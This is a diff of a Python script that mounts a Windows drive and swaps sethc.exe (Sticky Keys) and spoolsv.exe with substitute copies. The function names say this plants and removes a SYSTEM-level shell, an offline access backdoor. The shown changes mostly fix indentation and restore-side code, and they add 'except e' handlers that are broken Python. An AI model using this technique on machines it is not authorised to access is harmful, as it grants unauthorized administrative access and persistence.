@@ -281,7 +281,6 @@ def get_sticky_shell():
 
 
 def revert_sticky_shell():
-
     # gotta use the mount point made by mount_drive here from the 
     # user input i should implement some code that suggests a drive 
     # to choose based off of mounting other ones and lsing
@@ -298,16 +297,16 @@ def revert_sticky_shell():
     #        target_paths["system32"],
     #        target_paths["sethc"])) 
     
-   try:
-       shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
-           target_paths["windows"], 
-           target_paths["system32"],
-           target_paths["sethc"]), 
+    try:
+        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"]), 
 
-           '/mnt/windows/{}/{}/{}'.format(
-           target_paths["windows"], 
-           target_paths["system32"],
-           target_paths["sethc"].replace('.bak', '')))
+            '/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"].replace('.bak', '')))
 
     except FileNotFoundError as e:
         print(e)
@@ -401,7 +400,8 @@ def implant_SYSTEM_shell():
             '/mnt/windows/{}/{}/spoolsv.exe'.format(
             target_paths["windows"], 
             target_paths["system32"]))
-
+    except e:
+        print(e)
 def remove_SYSTEM_shell():
     target_paths = locate_spoolsv_bak()
     try:
@@ -415,6 +415,8 @@ def remove_SYSTEM_shell():
             target_paths["system32"],
             target_paths["spoolsv"].replace('.bak', '')))
 
+    except e:
+        print(e)
 def implant_userland_shell():
     pass
 
